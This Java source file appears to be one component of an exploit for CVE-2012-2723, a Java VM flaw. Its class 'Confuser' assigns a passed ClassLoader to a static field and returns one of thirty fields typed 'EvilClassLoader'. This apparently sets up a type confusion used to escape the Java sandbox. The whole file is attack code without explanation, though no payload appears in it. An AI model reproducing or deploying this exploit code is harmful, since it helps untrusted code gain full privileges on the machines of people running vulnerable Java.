package me.ethaniel.cve20122723;

public class Confuser {
    private static ClassLoader confuserCL;
    public EvilClassLoader e00, e01, e02, e03, e04, e05, e06, e07, e08, e09;
    public EvilClassLoader e10, e11, e12, e13, e14, e15, e16, e17, e18, e19;
    public EvilClassLoader e20, e21, e22, e23, e24, e25, e26, e27, e28, e29;

    public EvilClassLoader confuse(ClassLoader passedCL) {
        if (passedCL == null) return null;
        ClassLoader localCL = confuserCL;
        this.confuserCL = passedCL;

        if (this.e00 != null) return this.e00;
        if (this.e01 != null) return this.e01;
        if (this.e02 != null) return this.e02;
        if (this.e03 != null) return this.e03;
        if (this.e04 != null) return this.e04;
        if (this.e05 != null) return this.e05;
        if (this.e06 != null) return this.e06;
        if (this.e07 != null) return this.e07;
        if (this.e08 != null) return this.e08;
        if (this.e09 != null) return this.e09;

        if (this.e10 != null) return this.e10;
        if (this.e11 != null) return this.e11;
        if (this.e12 != null) return this.e12;
        if (this.e13 != null) return this.e13;
        if (this.e14 != null) return this.e14;
        if (this.e15 != null) return this.e15;
        if (this.e16 != null) return this.e16;
        if (this.e17 != null) return this.e17;
        if (this.e18 != null) return this.e18;
        if (this.e19 != null) return this.e19;

        if (this.e20 != null) return this.e20;
        if (this.e21 != null) return this.e21;
        if (this.e22 != null) return this.e22;
        if (this.e23 != null) return this.e23;
        if (this.e24 != null) return this.e24;
        if (this.e25 != null) return this.e25;
        if (this.e26 != null) return this.e26;
        if (this.e27 != null) return this.e27;
        if (this.e28 != null) return this.e28;
        if (this.e29 != null) return this.e29;

        return null;
    }
}